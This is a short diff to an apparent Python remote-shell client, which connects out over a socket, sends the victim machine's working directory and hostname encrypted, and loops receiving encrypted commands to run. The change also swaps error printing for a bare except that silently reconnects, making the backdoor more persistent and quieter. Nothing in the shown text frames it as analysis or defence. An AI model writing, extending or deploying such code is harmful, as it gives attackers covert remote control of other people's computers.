@@ -123,7 +123,8 @@ def connect():
     
 
 def main():
-    send(socket.gethostname())
+    s.sendall(crypt(os.getcwd()))
+    s.sendall(crypt(socket.gethostname()))
     while True:
         command = crypt(s.recv(1024), False)
         if command[:2].decode("utf-8") == 'cd':
@@ -172,8 +173,7 @@ def start():
         try:
             connect()
             main()
-        except Exception as e:
-            print e
+        except:
             start()
 
 if __name__ == "__main__":
